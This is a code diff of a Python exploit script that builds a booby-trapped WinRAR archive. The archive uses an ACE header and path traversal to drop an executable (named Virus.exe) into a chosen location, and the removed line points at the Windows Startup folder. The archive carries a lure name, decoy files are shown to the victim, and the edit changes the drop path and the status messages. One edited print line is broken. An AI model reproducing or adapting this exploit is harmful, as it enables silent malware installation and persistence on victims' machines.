@@ -10,8 +10,8 @@ rar_filename = "Rapidsafeguard.rar"
 # The evil file you want to run
 evil_filename = "calc.exe"
 # The decompression path you want, such shown below
-target_filename = "C:\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.exe"
-#target_filename="C:\Users\GTUGIC\Desktop\Payload\Virus.exe"
+#target_filename = "C:\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.exe"
+target_filename="C:\Users\GTUGIC\Desktop\Payload\Virus.exe"
 # Other files to be displayed when the victim opens the winrar
 # filename_list=[]
 filename_list = ["hello.txt", "world.txt"]
@@ -106,7 +106,7 @@ def build_file_once(filename, target_filename=""):
     build_file(content_raw.replace(shellcode.upper(), shellcode_new.upper()).replace("01020304050607080910A1A2A3A4A5A6A7A8A9", get_file_content(filename)), rar_filename)
 
 if __name__ == '__main__':
-    print("[*] Start to generate the archive file %s..."%(rar_filename))
+    print("[*] Generating payload %s..."%(rar_filename))
 
     shellcode_head = "6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A"
     build_file(shellcode_head, rar_filename)
@@ -116,4 +116,4 @@ if __name__ == '__main__':
 
     build_file_once(evil_filename, target_filename)
 
-    print("[+] Evil archive file %s generated successfully !"%(rar_filename))
+    print("[+] Winrar file Generated Successfully !"%(rar_filename))
